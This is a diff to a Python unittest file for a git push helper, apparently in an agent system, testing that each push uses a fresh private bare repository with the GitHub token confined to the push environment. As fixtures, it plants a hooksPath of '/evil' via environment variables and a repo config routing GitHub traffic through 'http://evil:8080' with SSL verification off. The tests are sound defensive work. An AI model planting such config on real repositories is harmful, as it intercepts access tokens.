@@ -390,17 +390,21 @@ class GitTest(unittest.TestCase):
         self.addCleanup(shutil.rmtree, self.tmp, True)
         self.push_dir = os.path.join(self.tmp, 'push.git')
 
-    def test_push_goes_through_a_private_bare_repo_with_the_token_only_in_the_push_env(self):
+    def test_push_goes_through_a_fresh_private_bare_repo_with_the_token_only_in_the_push_env(self):
         run = FakeRun()
         with mock.patch.dict(os.environ, {'SUPERAGENT_GITHUB_TOKEN': TOKEN, 'GIT_CONFIG_COUNT': '1',
                                           'GIT_CONFIG_KEY_0': 'core.hooksPath', 'GIT_CONFIG_VALUE_0': '/evil'}):
             gh_mod.push_branch('/w/t', 'agent/fix', TOKEN, REPO, self.push_dir, run=run)
         (init, init_kw), (fetch, fetch_kw), (push, push_kw) = run.calls
-        self.assertEqual(init, ['git', *HARDEN, 'init', '--bare', '-q', self.push_dir])
-        self.assertEqual(fetch, ['git', f'--git-dir={self.push_dir}', *HARDEN, 'fetch', '--no-tags', '/w/t',
+        git_dir = init[-1]
+        # A new repo per push, next to push_dir: config a worker planted in an older push repo can never apply.
+        self.assertNotEqual(git_dir, self.push_dir)
+        self.assertEqual(os.path.dirname(git_dir), os.path.dirname(self.push_dir))
+        self.assertFalse(os.path.exists(git_dir))  # removed after the push
+        self.assertEqual(init, ['git', *HARDEN, 'init', '--bare', '-q', git_dir])
+        self.assertEqual(fetch, ['git', f'--git-dir={git_dir}', *HARDEN, 'fetch', '--no-tags', '/w/t',
                                  '+HEAD:refs/heads/agent/fix'])
-        # The push repo's config is worker-reachable on disk, so the network settings that carry the token are pinned.
-        self.assertEqual(push, ['git', f'--git-dir={self.push_dir}', *HARDEN,
+        self.assertEqual(push, ['git', f'--git-dir={git_dir}', *HARDEN,
                                 '-c', 'http.proxy=', '-c', 'http.sslVerify=true',
                                 '-c', 'http.https://github.com/.proxy=', '-c', 'http.https://github.com/.sslVerify=true',
                                 'push', '--no-verify',
@@ -420,13 +424,23 @@ class GitTest(unittest.TestCase):
         self.assertEqual((env['GIT_TERMINAL_PROMPT'], env['GIT_CONFIG_NOSYSTEM'], env['GIT_CONFIG_GLOBAL']),
                          ('0', '1', os.devnull))
 
-    def test_push_reuses_an_existing_push_repo(self):
+    def test_a_planted_push_repo_config_is_never_used(self):
+        # A path-specific key such as http.https://github.com/o/r.git.proxy beats any command-line pin, so the
+        # only safe push repo is one nobody else could have written.
         os.makedirs(self.push_dir)
-        open(os.path.join(self.push_dir, 'HEAD'), 'w').close()
+        with open(os.path.join(self.push_dir, 'config'), 'w') as f:
+            f.write('[http "https://github.com/o/r.git"]\n\tproxy = http://evil:8080\n\tsslVerify = false\n')
         run = FakeRun()
         gh_mod.push_branch('/w/t', 'agent/fix', TOKEN, REPO, self.push_dir, run=run)
+        self.assertFalse(any(a in (self.push_dir, f'--git-dir={self.push_dir}') for argv, _ in run.calls for a in argv))
         self.assertEqual([next(a for a in argv if a in ('init', 'fetch', 'push')) for argv, _ in run.calls],
-                         ['fetch', 'push'])
+                         ['init', 'fetch', 'push'])
+
+    def test_the_fresh_push_repo_is_removed_when_the_push_fails(self):
+        run = FakeRun(1, stderr='fatal: denied')
+        with self.assertRaises(GitHubError):
+            gh_mod.push_branch('/w/t', 'agent/fix', TOKEN, REPO, self.push_dir, run=run)
+        self.assertEqual(os.listdir(self.tmp), [])
 
     def test_push_failure_raises_with_redacted_stderr(self):
         run = FakeRun(1, stderr=f'fatal: denied for {TOKEN} {AUTH}')
